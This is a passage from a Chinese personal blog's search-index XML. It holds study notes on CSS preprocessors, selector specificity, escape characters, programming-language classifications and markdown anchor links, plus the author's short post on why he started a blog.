使用了*符号，也可以进行计算，在用函数操作时，会识别你是继承自那个类，如果是字符串类，则进行拼接字符串，如果是数字，则继承数字类进行计算</p><p>或者理解为，在字符串类和数字类中，都有*该方法，但是定义的效果不同，因此当你声明变量的时候，就已经把该类赋予给了对象，因此可以调用其方法 此处引申到<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E5%9E%8B_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)" target="_blank" rel="noopener">多态的概念</a></p><p>css 属性的继承是一个非常重要的特性，好消息是三种预编译器都对此做出了改善。</p><ul><li>Sass和Stylus的继承非常像，能把一个选择器的所有样式继承到另一个选择器上。使用『@extend』开始，后面接被继承的选择器。</li></ul><div class="hljs"><pre><code class="hljs sass">.shit &#123;  margin: 10px 5px;  padding: 2px;&#125;p &#123;  @extend .shit;/*继承.block*/  border: 1px solid #aaa;&#125;ul,li &#123;  @extend .shit; /*继承.block*/  color: #aaa;&#125;</code></pre></div><p>将被编译成标准 css：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-class">.shit</span>,<span class="hljs-selector-tag">p</span>,<span class="hljs-selector-tag">ul</span>,<span class="hljs-selector-tag">ol</span> &#123;  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">5px</span>;  <span class="hljs-attribute">padding</span>:<span class="hljs-number">2px</span>;&#125;<span class="hljs-selector-tag">p</span> &#123;  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#aaa</span>&#125;<span class="hljs-selector-tag">ul</span>,<span class="hljs-selector-tag">li</span> &#123;  <span class="hljs-attribute">color</span>:<span class="hljs-number">#aaa</span>;&#125;</code></pre></div><ul><li>Less 继承：与前两者继承方式有所区别，它不是在选择器上继承，而是将Mixins中的样式嵌套到每个选择器里面。然而这样会带来一个明显的缺点：每个选择器中会出现重复的样式。</li></ul><h3 id="导入-import"><a href="#导入-import" class="headerlink" title="导入@import"></a>导入@import</h3><p>CSS中，不建议用@import导入css，因为会增加http请求。但 CSS 预处理器中的导入和CSS的有hhe很大区别，它是将不同 css 是在语义上导入，最终编译结果会生成一个CSS文件。</p><p>值得注意的是，如果不同文件相互引入的时候，出现相同变量名时可能会引起错误。所以我的建议是<strong>单独</strong>设一个 var.sass/less/styl 文件来记录所有你定义的变量。</p><h3 id="Imports"><a href="#Imports" class="headerlink" title="Imports"></a>Imports</h3><p>Rather than using a one large file, separating your codes in small pieces is helpful for expressing your declarations and increasing maintainability and control over the codebase. You can group the similar code chunks in similar folders and import them to main css file. Also with <code>import</code> statement, frameworks can also be added to work packages.</p><div class="hljs"><pre><code class="hljs sass">@import &quot;library&quot;;@import &quot;mixins/mixin.scss&quot;;@import &quot;reset.css&quot;;</code></pre></div><div class="hljs"><pre><code class="hljs less"><span class="hljs-keyword">@import</span> <span class="hljs-string">"library"</span><span class="hljs-variable">@import</span> <span class="hljs-string">"mixins/mixin.less"</span><span class="hljs-variable">@import</span> <span class="hljs-string">"reset.css"</span></code></pre></div><div class="hljs"><pre><code class="hljs stylus">@import <span class="hljs-string">"library"</span>@import <span class="hljs-string">"mixins/mixin.styl"</span>@import <span class="hljs-string">"reset.css</span></code></pre></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>三种与编译器都各有优点，选择熟练的和对团队合作有利的</li><li>stylus的便捷性更高，代码简洁</li><li>Sass和Less语法严谨、Stylus相对自由。因为Less长得更像 css，所以它可能学习起来更容易。</li></ul><p>css选择器的内容 特异性也指优先级</p><p>优先级：内嵌样式表&gt;层级样式表&gt;导入样式表</p><p>内嵌样式&gt;id选择器&gt;类选择器&gt;元素选择器&gt;通用选择器和继承选择器</p><p>最后定义的规则会覆盖任何先前的冲突规则。</p><p>选择器具有相同的特异性值时，最新的规则优先。</p><p>当选择器具有不相等的特异性值时，更具体的规则优先。</p><p>JOSN建构于两种结构：</p><ul><li>“名称/值”对的集合（A collection of name/value pairs）。不同的语言中，它被理解为<em>对象（object）</em>，纪录（record），结构（struct），字典（dictionary），哈希表（hash table），有键列表（keyed list），或者关联数组 （associative array）。</li><li>值的有序列表（An ordered list of values）。在大部分语言中，它被理解为数组（array）。</li></ul><p>关于转义字符，及取消转义字符的方法</p><p>所有的<a href="https://baike.baidu.com/item/ASCII码" target="_blank" rel="noopener">ASCII码</a>都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加\来表示常见的那些不能显示的ASCII<a href="https://baike.baidu.com/item/字符" target="_blank" rel="noopener">字符</a>，如\0,\t,\n等，就称为转义字符，因为后面的<a href="https://baike.baidu.com/item/字符/4768913" target="_blank" rel="noopener">字符</a>，都不是它本来的ASCII字符意思了。</p><table><thead><tr><th>转义字符</th><th>意义</th><th>ASCII码值（十进制）</th></tr></thead><tbody><tr><td>\a</td><td>响铃(BEL)</td><td>007</td></tr><tr><td>\b</td><td>退格(BS) ，将当前位置移到前一列</td><td>008</td></tr><tr><td>\f</td><td>换页(FF)，将当前位置移到下页开头</td><td>012</td></tr><tr><td>\n</td><td>换行(LF) ，将当前位置移到下一行开头</td><td>010</td></tr><tr><td>\r</td><td>回车(CR) ，将当前位置移到本行开头</td><td>013</td></tr><tr><td>\t</td><td>水平制表(HT) （跳到下一个TAB位置）</td><td>009</td></tr><tr><td>\v</td><td>垂直制表(VT)</td><td>011</td></tr><tr><td>\</td><td>代表一个反斜线字符’’&#39;</td><td>092</td></tr><tr><td>&#39;</td><td>代表一个单引号（撇号）字符</td><td>039</td></tr><tr><td>&quot;</td><td>代表一个双引号字符</td><td>034</td></tr><tr><td>?</td><td>代表一个问号</td><td>063</td></tr><tr><td>\0</td><td>空字符(NUL)</td><td>000</td></tr><tr><td>\ddd</td><td>1到3位八进制数所代表的任意字符</td><td>三位八进制</td></tr><tr><td>\xhh</td><td>十六进制所代表的任意字符</td><td>十六进制</td></tr></tbody></table><p><img src="https://ae01.alicdn.com/kf/H1c837463558045dbbe01995b7ea10f4ao.jpg" srcset="/img/loading.gif" alt="html转义表"></p><p>转义无非是两种情况：</p><p>1：将普通字符转为特殊用途，一般是编程语言中，用于表示不能直接显示的字符，比如后退键，回车键，等。2：用来将特殊意义的字符转换回它原来的意义。一般用在正则表达式中。还有有些脚本语言是弱类型，有些语言比如html 并不是编程语言，而是标记语言，有些语言只有一种类型 比如shell 脚本语言，这些语言中字符串都不加引号” ” ，或者可以不加引号“ ”，所以有时候需要转义字符说明某字符此时的身份是普通字符，而不是有特殊意义的元字符。比如你要显示&amp;quot;这个字符 ，而不出现&quot; ,可以采用两种方式 ，第一种是先把前面的&amp; 进行转义，再跟上后面的字符，这样就不会出现全部转义的情况，第二种可能在一些地方还是会识别，就是把后面的冒号去掉，推荐使用第一种 </p><p>另外出于网站的安全。在数据写入数据库前，都会使用转义字符(函数)对一些敏感字符进行转义。这样做可以避免一些别有用心的人利用特殊符号的注入攻击。 [1]  [3] </p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-css -开发工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于语言的分类</title>
    <link href="/2019/08/06/%E6%9D%82%E9%A1%B9/%E5%85%B3%E4%BA%8E%E8%AF%AD%E8%A8%80%E7%9A%84%E5%88%86%E7%B1%BB/"/>
    <url>/2019/08/06/%E6%9D%82%E9%A1%B9/%E5%85%B3%E4%BA%8E%E8%AF%AD%E8%A8%80%E7%9A%84%E5%88%86%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机语言分类"><a href="#计算机语言分类" class="headerlink" title="计算机语言分类"></a>计算机语言分类</h1><h2 id="编译型语言和解释型语言"><a href="#编译型语言和解释型语言" class="headerlink" title="编译型语言和解释型语言"></a>编译型语言和解释型语言</h2><p>​       计算机是不能理解高级语言，当然也就不能直接执行高级语言了。计算机只能直接理解机器语言，所以任何语言，都必须将其翻译成机器语言，计算 机才能运行高级语言编写的程序。</p><p>​          一、编译型语言和解释型语言</p><p>1、编译型语言</p><p>需通过编译器（compiler）将源代码编译成机器码，之后才能执行的语言。一般需经过编译（compile）、链接（linker）这两个步骤。编译是把源代码编译成机器码，链接是把各个模块的机器码和依赖库串连起来生成可执行文件。</p><p>优点：编译器一般会有预编译的过程对代码进行优化。  因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高 。可以脱离语言环境独立运行。 </p><p>缺点：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p><p>代表语言：C、C++、  Pascal、Object-C以及最近很火的苹果新语言swift</p><p>2、解释型语言</p><p>解释性语言的程序不需要编译，相比编译型语言省了道工序，解释性语言在运行程序的时候才逐行翻译。</p><p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p><p>缺点：每次运行的时候都要解释一遍，性能上不如编译型语言。</p><p>代表语言：JavaScript、Python、Erlang、PHP、Perl、Ruby</p><p>3、混合型语言</p><p>既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕。就出现了半编译型语言。比如C#,C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。Java先生成字节码再在Java虚拟机中解释执行。严格来说混合型语言也属于解释型语言。</p><p>​    两种方式只是翻译的时间不同。编译型语言写的程序在被执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如.exe文件，以  后要运行的话就不用重新翻译了，直接使用编译的结果就行了（.exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。 </p><p>​    解释则不同，解释性语言的程序不需要编译，省了道工序，解释性语言在运行程序的时候才翻译，比如解释性basic语言，专门有一个解释器能够直    接执行basic程序，每个语句都是执行的时候才翻译。这样解释性语言每执行一次就要翻译一次，效率比较低。</p><p>​    二、脚本语言</p><p>​    ①脚本语言(JavaScript,VBscript等)介于HTML和C,C++,Java,C#等编程语言之间 </p><p>​    HTML通常用于格式化和链结文本。而编程语言通常用于向机器发出一系列复杂的指令。 </p><p>​    ②脚本语言与编程语言也有很多相似地方，其函数与编程语言比较相象一些,其也涉及到变量。与编程语言之间最大的区别是编程语言的语法和规则更为严格和复杂一些。</p><p>​    ③与程序代码的关系:脚本也是一种语言，其同样由程序代码组成</p><p>​    注：脚本语言一般都有相应的脚本引擎来解释执行。 他们一般需要解释器才能运行。JAVASCRIPT,ASP,PHP,PERL都是脚本语言。C/C++编译、链接后，可形成独立执行的exe文件。 </p><p>​    ④脚本语言是一种解释性的语言</p><p>​    例如vbscript,javascript,installshield script等等,它不象c/c++等可以编译成二进制代码,以可执行文件的形式存在。脚本语言不需要编译，可以直接用，由解释器来负责解释，不过每次都需要翻译，执行速度慢。 </p><p>​    ⑤脚本语言一般都是以文本形式存在,类似于一种命令</p><p>​    举个例子说,如果你建立了一个程序,叫aaa.exe,可以打开.js为扩展名的文件。</p><p>​    你为.js文件的编写指定了一套规则(语法),当别人编写了.js文件后,你的程序用这种规则来理解编写人的意图,并作出回应.那么,这一套规则就是脚本语言。</p><h2 id="动态语言和静态语言"><a href="#动态语言和静态语言" class="headerlink" title="动态语言和静态语言"></a>动态语言和静态语言</h2><p>1、动态语言</p><p>运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p><p>主要动态语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p><p>2、静态语言</p><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p><p>3、注意：</p><p>很多人认为解释型语言都是动态语言，这个观点是错的！Java是解释型语言但是不是动态语言，Java不能在运行的时候改变自己结构。反之成立吗？动态语言都是解释型语言。也是错的！Object-C是编译型语言，但是他是动态语言。得益于特有的run time机制（准确说run time不是语法特性是运行时环境，这里不展开）OC代码是可以在运行的时候插入、替换方法的。</p><p>C#也是动态语言，通过C#的反射机制可以动态的插入一段代码执行。所以我说C#是这个星球最好的编程语言。</p><h2 id="动态类型语言和静态类型语言"><a href="#动态类型语言和静态类型语言" class="headerlink" title="动态类型语言和静态类型语言"></a>动态类型语言和静态类型语言</h2><p>1、动态类型语言</p><p>动态类型语言和动态语言是完全不同的两个概念。  动态类型语言是指在运行期间才去做数据类型检查的语言，说的是数据类型，动态语言说的是运行是改变结构，说的是代码结构。</p><p>动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p><p>主要语言：Python、Ruby、Erlang、JavaScript、swift、PHP、Perl。</p><p>2、静态类型语言</p><p>静态语言的数据类型是在编译其间确定的，写编写代码的时候要明确确定变量的数据类型。</p><p>主要语言：C、C++、C#、Java、Object-C。</p><p>3、注意：</p><p>认为解释型语言都是动态类型语言，编译型语言都是静态类型语言也是错的。swift是编译型语言但是它也是动态类型语言。C#和Java是解释型语言也是静态类型语言。</p><h2 id="强类型语言和弱类型语言"><a href="#强类型语言和弱类型语言" class="headerlink" title="强类型语言和弱类型语言"></a>强类型语言和弱类型语言</h2><p>1、强类型语言：</p><p>强类型语言，一旦一个变量被指定了某个数据类型，如果不经过强制类型转换，那么它就永远是这个数据类型。你不能把一个整形变量当成一个字符串来处理。</p><p>主要语言：Java、C#、Python、Object-C、Ruby</p><p>2、弱类型语言：</p><p>数据类型可以被忽略，一个变量可以赋不同数据类型的值。一旦给一个整型变量a赋一个字符串值，那么a就变成字符类型。</p><p>主要语言：JavaScript、PHP、C、C++（C和C++有争议，但是确实可以给一个字符变量赋整形值，可能初衷是强类型，形态上接近弱类型）</p><p>3、注意：</p><p>一个语言是不是强类型语言和是不是动态类型语言也没有必然联系。Python是动态类型语言，是强类型语言。JavaScript是动态类型语言，是弱类型语言。Java是静态类型语言，是强类型语言。</p><p>最后贴一张图进行区分</p><p><img src="https://ae01.alicdn.com/kf/H84eab9537b8d4c31a714da83aaf9117b2.jpg" srcset="/img/loading.gif" alt="语言分类图"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-计算机语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于markdown中的跳转设置方法</title>
    <link href="/2019/08/04/%E6%9D%82%E9%A1%B9/markdown%E5%AE%9A%E4%BD%8D/"/>
    <url>/2019/08/04/%E6%9D%82%E9%A1%B9/markdown%E5%AE%9A%E4%BD%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="关于markdown内跳转的方法与设置"><a href="#关于markdown内跳转的方法与设置" class="headerlink" title="关于markdown内跳转的方法与设置"></a>关于markdown内跳转的方法与设置</h1><h2 id="Markdown目录树"><a href="#Markdown目录树" class="headerlink" title="Markdown目录树"></a>Markdown目录树<span id="1"></span></h2><p>想要给文档生成目录树，在需要在文档的位置，增加[TOC]目录树，就会根据文档中的h1~h6标题自动生成目录，在有些平台上不支持该功能，此外有些平台自带该功能时，也不支持该功能。则会显示出[TOC]<br>字样</p><p>注：[TOC]需要独占一行才能生效。比如： </p><blockquote><p>……<br>    [TOC]<br>    ……</p></blockquote><h2 id="页内跳转的两种方法"><a href="#页内跳转的两种方法" class="headerlink" title="页内跳转的两种方法"></a>页内跳转的两种方法</h2><p>Markdown会自动给每一个h1~h6标题生成一个锚，其id就是标题内容。目录树中的每一项都是一个跳转链接，点击后就会跳转到其对应的锚点（即标题所在位置）<br>如果需要在目录树之外还要增加跳转到某个标题的链接，则有两种办法可以做到： </p><blockquote><ol><li>使用Markdown的语法来增加跳转链接：<code>[名称](#id)</code>。     </li><li>使用HTML语法来增加跳转链接：<code>&lt;a href=&quot;#id&quot;&gt;名称</code></li></ol></blockquote><p>此处的名称为显示的内容，id为跳转到的内容，例如你想要跳到文章的标题你可以这样写：</p><div class="hljs"><pre><code>(1)[点击我跳到文章开头](#关于markdown内跳转的方法与设置)  </code></pre></div><p><a href="#关于markdown内跳转的方法与设置">点击我跳到文章开头</a></p><p>第二种写法使用HTML语言实现跳转：</p><div class="hljs"><pre><code>(2)&lt;a href=&quot;#关于markdown内跳转的方法与设置&quot;&gt;名称</code></pre></div><p><a href="#关于markdown内跳转的方法与设置">点击我跳到文章开头</a></p><h2 id="自定义锚"><a href="#自定义锚" class="headerlink" title="自定义锚"></a>自定义锚</h2><p>假设我们想跳转到文档中的一个不是标题的位置，则需要在该位置自定义一个锚。<br>我们使用HTML语法来定义一个锚。可选的HTML标签很多，比如<code>&lt;span&gt;、&lt;a&gt;</code>等等。你可以这样写</p><div class="hljs"><pre><code>`&lt;span id=&quot;内容&quot;&gt;名称`  `&lt;a id=&quot;内容&quot;&gt;名称`</code></pre></div><p>其中id为你需要跳转的元素id，名称作用如上，下面举一个例子,我已经事先在我的二级标题下添加了一个<code>&lt;span id=&quot;1&quot;&gt;</code>,然后再线面写下如下代码即可实现跳转</p><div class="hljs"><pre><code>[点我跳到markdown目录树](#1)</code></pre></div><p><a href="#1">点我跳到markdown目录树</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>-学习 -分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于我自己</title>
    <link href="/2019/08/02/%E6%84%9F%E6%83%B3/%E5%85%B3%E4%BA%8E%E6%88%91%E8%87%AA%E5%B7%B1/"/>
    <url>/2019/08/02/%E6%84%9F%E6%83%B3/%E5%85%B3%E4%BA%8E%E6%88%91%E8%87%AA%E5%B7%B1/</url>
    
    <content type="html"><![CDATA[<p>关于梦想，有很多话要说，只是手一放在键盘上，就不知该写下些什么，只好苦苦挤牙膏式的写着。<br>先来说说我为什么要搭建博客吧，记得还是几年前，就觉得拥有一个自己的博客是一件非常了不起的事情，只是目光短浅，并没有实际去做，最后也只能落得一事无成，近来觉得本专业实在天坑，于是开始转攻计算机方向，开辟新大陆，这才想起，程序员的标配，拥有自己的一个博客，于是开始胡乱的开始找资料，一步一步的搭建。<br>终于搭好，然后部署到GitHub上后，我拥有的短暂的一秒钟兴奋时间，过后，便有开始捣鼓其样式来，接着又是学习markdown语法啥的，在第二天，写下这篇关于我为什么要搭建博客的文章。<br>总的来说，还是为了能够不断提高自己，曾记得有一句话，不要用战术上的勤奋来掩盖战略上的懒惰。 确实啊，每天忙忙碌碌的学着，若是不知道总结，也仅仅是留在大脑中的一个印象罢了。<br>未来的日子，任重道远，还有很多知识要学，很多路要走，希望自己能够在前进的路上写下华丽的诗篇，未来可期 ，加油！</p>]]></content>
    
    
    <categories>
      
      <category>梦想</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-导航 -分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
